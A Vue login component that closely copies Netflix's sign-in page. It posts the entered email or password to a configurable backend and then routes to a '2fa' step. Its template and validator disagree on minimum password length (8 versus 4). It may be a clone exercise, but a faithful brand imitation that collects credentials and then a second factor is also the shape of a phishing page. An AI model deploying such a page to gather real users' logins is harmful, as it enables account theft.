<template>
  <div class="login-container">
    <div class="login-card">
      <h1>Sign In</h1>

      <div v-if="error" class="error-box">{{ error }}</div>

      <form @submit.prevent="handleLogin" novalidate>
        <div class="form-group">
          <input
            v-model.trim="username"
            type="text"
            placeholder="Email or phone number"
            @input="validateEmailOrPhone"
            :class="{ error: emailError }"
            autocomplete="username"
          />
          <p v-if="emailError" class="error-text">
            Please enter a valid email or phone number
          </p>
        </div>

        <div class="form-group password-field">
          <input
            :type="showPassword ? 'text' : 'password'"
            v-model="password"
            placeholder="Password"
            @input="validatePassword"
            :class="{ error: passwordError }"
            autocomplete="current-password"
          />
          <button type="button" class="toggle-btn" @click="togglePassword">
            {{ showPassword ? "🙈" : "👁️" }}
          </button>
          <p v-if="passwordError" class="error-text">
            Your password must be between 8 and 60 characters
          </p>
        </div>

        <button type="submit" class="btn">Sign In</button>

        <div class="or-divider">OR</div>

        <router-link to="/code" class="router-button">
          <button type="button" class="btn code-btn">Sign in with code</button>
        </router-link>

        <p class="signup">
          New to Netflix?
          <a href="#">Sign up now.</a>
        </p>

        <p class="disclaimer">
          This page is protected by Google reCAPTCHA to ensure you're not a bot.
          <a href="#">Learn more.</a>
        </p>
      </form>
    </div>
  </div>
</template>

<script>
import { useAuthStore } from "@/stores/auth";

export default {
  name: "LoginView",
  setup() {
    const authStore = useAuthStore();
    return { authStore };
  },
  data() {
    return {
      username: "",
      password: "",
      rememberMe: false,
      error: "",
      showPassword: false,
      emailError: "",
      passwordError: "",
      loading: false,
    };
  },
  methods: {
    validateEmailOrPhone() {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^\+?\d{10,14}$/;
      this.emailError =
        !emailRegex.test(this.username) && !phoneRegex.test(this.username)
          ? "Please enter a valid email or phone number"
          : "";
    },
    validatePassword() {
      this.passwordError =
        this.password.length < 4 || this.password.length > 60
          ? "Your password must be between 4 and 60 characters"
          : "";
    },
    async handleLogin() {
      this.validateEmailOrPhone();
      this.validatePassword();
      if (this.emailError || this.passwordError) return;

      this.loading = true;
      this.error = "";

      const baseUrl = process.env.VUE_APP_API_BASE_URL;

      try {
        const response = await fetch(`${baseUrl}/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: this.username,
            password: this.password,
          }),
        });

        const result = await response.json();

        if (!response.ok) {
          this.error = result.error || "Login failed. Please try again.";
        } else {
          this.authStore?.login?.("demo");
          this.$router.push("/2fa");
        }
      } catch (err) {
        console.error("Login error:", err);
        this.error = "Server error. Please try again later.";
      }

      this.loading = false;
    },
    togglePassword() {
      this.showPassword = !this.showPassword;
    },
  },
};
</script>

<style scoped>
.login-container {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  background: transparent;
  z-index: 2;
}

.login-card {
  background: rgba(0, 0, 0, 0.75);
  padding: 3rem 2.5rem;
  width: 100%;
  max-width: 460px;
  color: #fff;
  border-radius: 6px;
  text-align: left;
  box-sizing: border-box;
  box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
  min-height: 600px; /* added vertical stretch to match Netflix */
  display: flex;
  flex-direction: column;
  justify-content: center;
}

h1 {
  margin-bottom: 1.5rem;
}

.form-group {
  margin-bottom: 1rem;
  position: relative;
  display: block;
}

input[type="text"],
input[type="password"] {
  width: 100%;
  padding: 0.75rem;
  background: #333;
  border: none;
  border-radius: 4px;
  color: #fff;
  font-size: 1rem;
  box-sizing: border-box;
}

input.error {
  border: 2px solid #e87c03 !important;
}

.toggle-btn {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  background: transparent;
  border: none;
  color: #b3b3b3;
  cursor: pointer;
  font-size: 16px;
}

.error-text {
  color: #e87c03;
  font-size: 0.85rem;
  margin-top: 0.5rem;
}

.error-box {
  background-color: #e87c03;
  padding: 0.75rem;
  margin-bottom: 1rem;
  border-radius: 4px;
  font-size: 0.9rem;
  color: #fff;
  box-sizing: border-box;
}

.btn {
  width: 100%;
  padding: 0.75rem;
  background: #e50914;
  border: none;
  color: #fff;
  font-weight: bold;
  border-radius: 4px;
  margin-top: 1rem;
  cursor: pointer;
  text-align: center;
  display: flex;
  align-items: center;
  justify-content: center;
}

.router-button {
  display: block;
  width: 100%;
  text-decoration: none;
}

.code-btn {
  background: #333;
  margin-top: 1rem;
  width: 100%;
  padding: 0.75rem;
  color: #fff;
  font-weight: bold;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.or-divider {
  text-align: center;
  margin: 1rem 0;
  color: #b3b3b3;
  font-size: 0.95rem;
}

.signup {
  font-size: 0.95rem;
  margin-top: 1rem;
}

.signup a {
  color: #fff;
  text-decoration: none;
  margin-left: 0.3rem;
}

.disclaimer {
  color: #8c8c8c;
  font-size: 0.75rem;
  margin-top: 2rem;
  line-height: 1.4;
}

.disclaimer a {
  color: #0071eb;
  text-decoration: none;
}

@media (max-width: 600px) {
  .login-card {
    padding: 1rem 1rem;
    max-width: 90%;
    min-height: 500px;
    justify-content: flex-start;
  }
}
</style>
